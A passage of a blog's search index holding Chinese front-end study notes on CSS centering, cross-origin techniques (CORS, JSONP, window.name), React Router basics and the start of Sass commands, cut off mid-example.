50%),  linear-gradient(rgba(200,0,0,.5) 50%, transparent 50%);  background-size:50px 50px;}.veins9{  background-color: gray;  background-image: linear-gradient(90deg, transparent 50%, rgba(255,255,255,.5) 50%);  background-size: 50px 50px;}</style><div class="veins">  <div class="veins1"></div>  <div class="veins2"></div>  <div class="veins3"></div>  <div class="veins4"></div>  <div class="veins5"></div>  <div class="veins6"></div>  <div class="veins7"></div>  <div class="veins8"></div>  <div class="veins9"></div></div></p><p><br></p><h4 id="11-不定宽高元素水平垂直居中"><a href="#11-不定宽高元素水平垂直居中" class="headerlink" title="11. 不定宽高元素水平垂直居中"></a>11. 不定宽高元素水平垂直居中</h4><p><em>不适合的方案</em></p><ul><li>text-align和line-height</li><li>position:absolute, 50%, margin: -px</li></ul><p><em>正确的方法</em></p><ul><li><p>display:table和display:table-cell</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: table;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: table-cell;</span><br><span class="line">  <span class="attribute">vertical-align</span>:middle;</span><br><span class="line">  <span class="attribute">text-align</span>:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>flex</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>position:absolute, 50%, translate</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translate</span>(-50%, -50%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>vw, vh和translate</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>:fixed;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">50vh</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50vw</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translate</span>(-50%, -50%); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>:before和display:inline-block</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.container</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.inner</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://leaverou.github.io/css3patterns/" target="_blank" rel="noopener">CSS3 Patterns Gallery 纹路背景</a></li><li><a href="http://www.ruanyifeng.com/blog/2015/07/flex-examples.html" target="_blank" rel="noopener">Flex 布局教程：实例篇</a></li><li><a href="https://www.jianshu.com/p/d2be62a507b8" target="_blank" rel="noopener">多行溢出</a></li><li>《图解CSS3·核心技术与案例实践》 大漠[著]</li><li><a href="https://blog.csdn.net/zh_rey/article/details/77531224" target="_blank" rel="noopener">阻止因出现滚动条导致页面抖动</a></li><li><a href="https://www.jianshu.com/p/69c570f4c1cb" target="_blank" rel="noopener">能够让不定宽高元素水平和垂直居中的方法</a></li></ul>]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JS跨域</title>
      <link href="/2018/11/06/JS%E8%B7%A8%E5%9F%9F/"/>
      <url>/2018/11/06/JS%E8%B7%A8%E5%9F%9F/</url>
      <content type="html"><![CDATA[<h3 id="1-同源策略"><a href="#1-同源策略" class="headerlink" title="1. 同源策略"></a>1. 同源策略</h3><p>为什么会出现跨域？因为存在同源策略。</p><blockquote><p>同源策略限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。（同源: 如果两个页面的协议，端口和域名都相同，则两个页面具有相同的源。）</p></blockquote><p><br></p><h4 id="1-1-受同源策略约束的交互"><a href="#1-1-受同源策略约束的交互" class="headerlink" title="1.1 受同源策略约束的交互"></a>1.1 受同源策略约束的交互</h4><ul><li><em>dom同源策略</em><br>禁止对不同源页面DOM进行操作。这里主要场景是iframe跨域的情况，不同域名的iframe是限制互相访问的。</li><li><em>XmlHttpRequest同源策略</em><br>禁止使用XHR对象向不同源的服务器地址发起HTTP请求。<br><br></li></ul><h4 id="1-2-可执行的跨源访问"><a href="#1-2-可执行的跨源访问" class="headerlink" title="1.2 可执行的跨源访问"></a>1.2 可执行的跨源访问</h4><ul><li><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> 标签嵌入跨域脚本 </li><li><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code> 标签嵌入CSS</li><li><code>&lt;img&gt;</code>嵌入图片</li><li><code>&lt;video&gt; 和 &lt;audio&gt;</code> 嵌入多媒体资源。</li><li><code>&lt;object&gt;, &lt;embed&gt; 和 &lt;applet&gt;</code>的插件</li><li><code>@font-face</code> 引入的字体</li><li><code>&lt;frame&gt; 和 &lt;iframe&gt;</code> 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。</li><li><code>CORS</code>跨域资源共享机制，允许跨域访问</li></ul><p><br></p><h3 id="2-跨域解决方案"><a href="#2-跨域解决方案" class="headerlink" title="2. 跨域解决方案"></a>2. 跨域解决方案</h3><h4 id="2-1-CORS"><a href="#2-1-CORS" class="headerlink" title="2.1 CORS"></a>2.1 CORS</h4><p>CORS 跨域资源共享，它允许浏览器向跨域服务器，发出XMLHttpRequest请求，从而克服ajax只能同源使用的限制。</p><p>整个CORS通信过程，由浏览器自动完成，对开发者来说，CORS通信与ajax没有差别。浏览器一旦发现ajax请求跨源，会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。<em>浏览器将CORS请求分成两类：简单请求和非简单请求</em></p><p><br></p><h5 id="2-1-1-CORS简单请求"><a href="#2-1-1-CORS简单请求" class="headerlink" title="2.1.1 CORS简单请求"></a>2.1.1 CORS简单请求</h5><p>简单请求需满足两个条件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、请求方法是以下三种之一</span><br><span class="line">HEAD</span><br><span class="line">GET</span><br><span class="line">POST</span><br><span class="line"></span><br><span class="line">2、HTTP的头部信息不超过以下几种</span><br><span class="line">Accept</span><br><span class="line">Accept-Language</span><br><span class="line">Content-Language</span><br><span class="line">Last-Event-ID</span><br><span class="line">Content-Type：限三个值application/x-www-form-urlencoded、multipart/form-data、text/plain</span><br></pre></td></tr></table></figure></p><p>对于简单请求，浏览器直接发出CORS请求，并在头信息中，增加<code>Origin</code>字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /cors HTTP/1.1</span><br><span class="line">Origin: http://api.bob.com</span><br><span class="line">Host: api.alice.com</span><br></pre></td></tr></table></figure></p><p>如果<code>Origin</code>指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应，回应头信息中没有<code>Access-Control-Allow-Origin</code>字段，就知道错了，从而抛出一个错误，被<code>XMLHttpRequest</code>的<code>onerror</code>回调函数捕获。</p><p>如果<code>Origin</code>指定的源在许可范围内，服务器返回的响应，会多出几个头信息字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://api.bob.com  // 接受哪些域名的请求</span><br><span class="line">Access-Control-Allow-Credentials: true           // 是否允许发送cookie</span><br><span class="line">Access-Control-Expose-Headers: FooBar            // 可选</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="2-1-2-CORS非简单请求"><a href="#2-1-2-CORS非简单请求" class="headerlink" title="2.1.2 CORS非简单请求"></a>2.1.2 CORS非简单请求</h5><p>对服务器有特殊要求的请求，如请求方法是<code>PUT</code>或<code>DELETE</code>,或<code>Content-Type</code>字段类型是<code>application/json</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var url = &apos;http://api.alice.com/cors&apos;;</span><br><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line">xhr.open(&apos;PUT&apos;, url, true);</span><br><span class="line">xhr.setRequestHeader(&apos;X-Custom-Header&apos;, &apos;value&apos;);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure></p><p>非简单请求，会在正式通信之前，增加一次HTTP查询请求，称为“预检”（preflight）。<br><em>预检请求</em>用的请求方法是<code>OPTIONS</code>，表示这个请求是用来询问的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 预检请求的头信息</span><br><span class="line">OPTIONS /cors HTTP/1.1</span><br><span class="line">Origin: http://api.bob.com</span><br><span class="line">Access-Control-Request-Method: PUT</span><br><span class="line"></span><br><span class="line">// 指定浏览器CORS请求会额外发送的头信息字段</span><br><span class="line">Access-Control-Request-Headers: X-Custom-Header </span><br><span class="line">Host: api.alice.com</span><br></pre></td></tr></table></figure></p><p>服务器收到“预检”请求号，检查了<code>Origin, Access-Control-Request-Method 和 Access-Control-Request-Headers</code>字段后，确定允许跨域请求，做出回应。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">// 服务器回应的CORS相关字段</span><br><span class="line">Access-Control-Allow-Origin: http://api.bob.com</span><br><span class="line">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class="line">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class="line">Access-Control-Max-Age: 1728000</span><br></pre></td></tr></table></figure></p><p>如果服务器否定了“预检”请求，会返回一个正常的HTTP回应，但没有任何CORS相关的头信息字段。浏览器会认定服务器不同意预检请求，因此触发一个错误，被<code>XMLHttpRequest</code>的<code>onerror</code>回调函数捕获。</p><p><br></p><h5 id="2-1-3-withCredentials"><a href="#2-1-3-withCredentials" class="headerlink" title="2.1.3 withCredentials"></a>2.1.3 withCredentials</h5><p>CORS请求默认不发送Cookie和HTTP认证信息。如果要把cookie发到服务器，服务器需要指定<code>Access-Control-Allow-Credentials</code>字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure></p><p>开发者必须在ajax请求中打开<code>withCredentials</code>属性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line">xhr.withCredentials = true;</span><br></pre></td></tr></table></figure></p><p>注意，如果要发送Cookie，<code>Access-Control-Allow-Origin</code>不能设为星号，必须指定明确的，与请求网页一致的域名。同时，Cookie仍遵循同源政策，跨源(原网页代码中)的<code>document.cookie</code>无法读取服务器域名下的Cookie。</p><p><br></p><h4 id="2-2-JSONP"><a href="#2-2-JSONP" class="headerlink" title="2.2 JSONP"></a>2.2 JSONP</h4><p>动态增加来一个script标签，请求来自服务器的一段js并执行。（只能get请求）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    // script加载完成后执行该代码</span><br><span class="line">    var functionHandler = function(data)&#123;</span><br><span class="line">        console.log(data);</span><br><span class="line">    &#125;</span><br><span class="line">    // 请求中可以增加参数</span><br><span class="line">    var url = &apos;http://xxx.com/xxxx?prams=xxx&amp;callback=functionHandler&apos;;</span><br><span class="line">    var script = document.createElement(&apos;script&apos;);</span><br><span class="line">    script.setAttribute(&apos;src&apos;, url);</span><br><span class="line">    document.getElementsByTagName(&apos;head&apos;)[0].appendChild(script); </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>服务器返回的script文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">functionHandler(data)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-服务器代理"><a href="#2-3-服务器代理" class="headerlink" title="2.3 服务器代理"></a>2.3 服务器代理</h4><p>在服务器端配置好代理，浏览器端就不会出现跨域的问题<br>在开发阶段比较常实现<br>devsever的proxy就是用来该原理<br>在devsever中配置代理，原指向devserver的请求被代理到目标地址，在服务器中http请求没有跨域限制，所以解决了浏览器js跨域的问题</p><p><br></p><h4 id="2-4-document-domain"><a href="#2-4-document-domain" class="headerlink" title="2.4 document.domain"></a>2.4 document.domain</h4><p>修改<code>document.domain</code>实现子域不同的页面进行跨域交互。<code>document.domain</code>存放的是载入文档的服务器的主机名，可以手动设置这个属性，但只能设置成当前域名或上级域名，如id.qq.com, qq.com。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.domain = 顶级域名</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-5-window-name"><a href="#2-5-window-name" class="headerlink" title="2.5 window.name"></a>2.5 window.name</h4><p><code>window.name</code>利用同一窗体下加载不同的页面，window.name的值不会清除，达到传递数据的效果。（数据大小支持到2MB）。具体操作需要3个页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a 域名下的 origin page</span><br><span class="line">a 域名下的 proxy page</span><br><span class="line">b 域名下的 data page</span><br></pre></td></tr></table></figure></p><p>a 域名下origin page 通过动态的iframe 加载 data page, data page中设置了window.name = data数据。</p><p>可是此时 origin page的域名与data page域名不一致，浏览器限制交互，所以需要将iframe跳转到proxy page（即iframe的scr值设置为proxy page）。此时iframe与 origin page同源，可以操作获取到iframe 的window.name中的数据，获取完毕后销毁iframe。</p><p>这样origin page就可以获取到非同源下的 data page数据。</p><p>a域名下的 origin page<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var a=document.getElementsByTagName(&quot;button&quot;)[0];</span><br><span class="line">    a.onclick=function()&#123;                               </span><br><span class="line">        var inf=document.createElement(&quot;iframe&quot;);       //创建iframe</span><br><span class="line">        inf.src=&quot;http://www.b.com/data.html&quot;+&quot;?h=5&quot;     //加载数据页www.b.com/data.html?h=5</span><br><span class="line">        var body=document.getElementsByTagName(&quot;body&quot;)[0];</span><br><span class="line">        body.appendChild(inf);                          //引入a页面</span><br><span class="line"></span><br><span class="line">        inf.onload=function()&#123;</span><br><span class="line">            inf.src=&apos;http://www.a.com/proxy.html&apos;       //iframe加载完成，加载www.a.com域下边的空白页proxy.html</span><br><span class="line">            console.log(inf.contentWindow.name)        //输出window.name中的数据</span><br><span class="line">            body.removeChild(inf)                      //清除iframe</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>b域名下 data page<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    // var str = window.location.href.substr(-1,1);      //获取url中携带的参数值h=5</span><br><span class="line">    // 因为已经是b域名下的页面了，可以通过请求各种b域名下的数据再设置window.name的值</span><br><span class="line">    window.name = &apos;some data&apos;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.xiaolai.cc/2018/11/02/js%E8%B7%A8%E5%9F%9F/" target="_blank" rel="noopener">js跨域</a></li><li><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">跨域资源共享 CORS 详解</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>React Router</title>
      <link href="/2018/11/06/Router/"/>
      <url>/2018/11/06/Router/</url>
      <content type="html"><![CDATA[<h3 id="1-React-Router"><a href="#1-React-Router" class="headerlink" title="1. React-Router"></a>1. React-Router</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npm install -g create-react-app</span><br><span class="line">create-react-app demo-app</span><br><span class="line">cd demo-app</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> All of the components that you use in a web application should be imported from react-router-dom</span><br><span class="line"><span class="meta">#</span> Copy/paste either of the examples (below) into your src/App.js.</span><br><span class="line">npm install react-router-dom</span><br></pre></td></tr></table></figure><p>React Router中有三类组件</p><ul><li>router components</li><li>route matching components</li><li>and navigation components.</li></ul><p><br></p><h4 id="1-1-Routers"><a href="#1-1-Routers" class="headerlink" title="1.1 Routers"></a>1.1 Routers</h4><p>For web projects, react-router-dom provides <code>&lt;BrowserRouter&gt;</code> and <code>&lt;HashRouter&gt;</code> routers. Both of these will create a specialized history object for you.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import &#123; BrowserRouter &#125; from "react-router-dom";</span><br><span class="line">ReactDOM.render(</span><br><span class="line">  <span class="tag">&lt;<span class="name">BrowserRouter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">App</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">BrowserRouter</span>&gt;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-2-Route-Matching"><a href="#1-2-Route-Matching" class="headerlink" title="1.2 Route Matching"></a>1.2 Route Matching</h4><p>There are two route matching components: <code>&lt;Route&gt;</code> and <code>&lt;Switch&gt;</code>. Route matching is done by comparing a <route>‘s path prop to the current location’s pathname. When a <route> matches it will render its content. Then <switch> component is used to group <route>s together.</route></switch></route></route></p><p>A <switch> is useful. It will iterate over all of its children <route> elements and only render the first one that matches the current location. This helps when multiple route’s paths match the same pathname, when animating transitions between routes, and in identifying when no routes match the current location(so that you can render a “404” component).</route></switch></p><p><em>Route Rendering Props</em><br>You have three prop choices for how you render a component for a given <route>: component, render and children.</route></p><p><code>component</code> should be used when you have an existing component that you want to render. <code>render</code>, which takes an inline function, should only be used when you have to pass in-scope variables to the component you want to render.<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Route, Switch &#125; <span class="keyword">from</span> <span class="string">"react-router-dom"</span>;</span><br><span class="line"></span><br><span class="line">&lt;Switch&gt;</span><br><span class="line">  &lt;Router exact path=<span class="string">"/"</span> component=&#123;Home&#125; /&gt;</span><br><span class="line">  &lt;Router path=<span class="string">"/about"</span>  component=&#123;About&#125; /&gt;</span><br><span class="line">  &#123;<span class="comment">/* Route rendering props */</span>&#125;</span><br><span class="line">  &lt;Route</span><br><span class="line">    path=<span class="string">"/about"</span></span><br><span class="line">    render=&#123;props =&gt; <span class="xml"><span class="tag">&lt;<span class="name">About</span> &#123;<span class="attr">...props</span>&#125; <span class="attr">extra</span>=<span class="string">&#123;someVariable&#125;</span> /&gt;</span>&#125;</span></span><br><span class="line"><span class="xml">  /&gt;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line">  &#123;/* when none of the above match, &lt;NoMatch&gt; will be rendered */&#125;</span><br><span class="line">  &lt;Rounte component=&#123;NoMatch&#125;&gt;</span><br><span class="line">&lt;/Switch&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-3-Navigation"><a href="#1-3-Navigation" class="headerlink" title="1.3 Navigation"></a>1.3 Navigation</h4><p>React Router provides a <link> component to create links in your application. Wherever you render a <link>, an anchor <code>&lt;a&gt;</code> will be rendered in your application’s HTML.<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;Link to=<span class="string">"/"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&#123;<span class="comment">/* */</span>&#125;</span><br><span class="line">&lt;NavLink to=<span class="string">"/react"</span> activeClassName=<span class="string">"hurray"</span>&gt;</span><br><span class="line">  React</span><br><span class="line">&lt;<span class="regexp">/NavLink&gt;</span></span><br></pre></td></tr></table></figure></p><p>Any time that you want to force navigation, you can render a <code>&lt;Redirect&gt;</code>. When a <redirect> renders, it will navigate using its to prop.<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Redirect to=<span class="string">"/login"</span> /&gt;</span><br></pre></td></tr></table></figure></redirect></p><h3 id="1-路由功能"><a href="#1-路由功能" class="headerlink" title="1. 路由功能"></a>1. 路由功能</h3><p>回退功能</p><h3 id="2-hash路由"><a href="#2-hash路由" class="headerlink" title="2. hash路由"></a>2. hash路由</h3><h3 id="3-HTML5-History-API"><a href="#3-HTML5-History-API" class="headerlink" title="3. HTML5 History API"></a>3. HTML5 History API</h3><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://juejin.im/post/5ac61da66fb9a028c71eae1b#heading-1" target="_blank" rel="noopener">https://juejin.im/post/5ac61da66fb9a028c71eae1b#heading-1</a><br><a href="https://github.com/kaola-fed/blog/issues/137" target="_blank" rel="noopener">https://github.com/kaola-fed/blog/issues/137</a><br><a href="https://juejin.im/post/5b10b46df265da6e2a08a724" target="_blank" rel="noopener">https://juejin.im/post/5b10b46df265da6e2a08a724</a><br><a href="https://juejin.im/entry/5751b8cea341310063bc91e9#/" target="_blank" rel="noopener">https://juejin.im/entry/5751b8cea341310063bc91e9#/</a></p><ul><li><a href="https://reacttraining.com/react-router/web/guides/quick-start" target="_blank" rel="noopener">React-router文档</a></li><li><a href="https://router.happyfe.com/" target="_blank" rel="noopener">React-router中文文档</a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Sass常用命令</title>
      <link href="/2018/11/06/Sass%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/11/06/Sass%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>Sass是一款强化CSS的辅助功能，它在CSS语法上增加了变量，嵌套，混合，导入等功能。 你还可以通过函数进行颜色值与属性值得运算，使用控制指令(control directives)等高级功能。<br><br></p><h3 id="1-编译sass"><a href="#1-编译sass" class="headerlink" title="1. 编译sass"></a>1. 编译sass</h3><p>–watch 监听<br>–style 解析后的css是什么排版格式 nested / expanded / compact / compressed(压缩)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sass input.scss output.scss</span><br><span class="line">sass --watch input.scss:output.scss</span><br><span class="line">sass --watch app/sass:public/stylesheets</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-导入sass"><a href="#2-导入sass" class="headerlink" title="2. 导入sass"></a>2. 导入sass</h3><ul><li>导入局部文件<br>@import 规则规则不需要指明被导入文件的全名，可以省略 .sass 或 .scss 文件后缀。<br>如果需要导入sass文件，但又不希望将其编译为CSS，只需在文件名前添加下划线，这样会告诉sass不要编译这些文件。导入语句中不需要添加下划线。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@import &quot;colors&quot;</span><br></pre></td></tr></table></figure></li></ul><p>导入的其实是 _colors.scss</p><ul><li>CSS规则内导入<br>@import 文件导入到一个CSS规则内<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// _blue-theme.scss</span><br><span class="line">aside&#123; background: blue &#125;</span><br><span class="line"></span><br><span class="line">// main.scss</span><br><span class="line">.container&#123; @import &quot;blue-theme&quot; &#125;</span><br><span class="line">.contaienr&#123;</span><br><span class="line">  aside&#123; background: blue &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-变量"><a href="#3-变量" class="headerlink" title="3. 变量"></a>3. 变量</h3><ul><li><p><em>$</em><br>定义变量，变量支持块级作用域，嵌套规则内定义的变量只能在嵌套规则内使用(局部变量)。将局部变量转换为全局变量可添加<code>!global</code>声明。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$blue: #4788C7;</span><br><span class="line">$border: 1px solid $blue;</span><br><span class="line">.nav&#123;</span><br><span class="line">  border: $border;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em>&amp;</em><br>表示父选择器，常用于添加伪类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">article a &#123;</span><br><span class="line">  &amp;:hover &#123; color: red &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟随后缀生成复合的选择器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 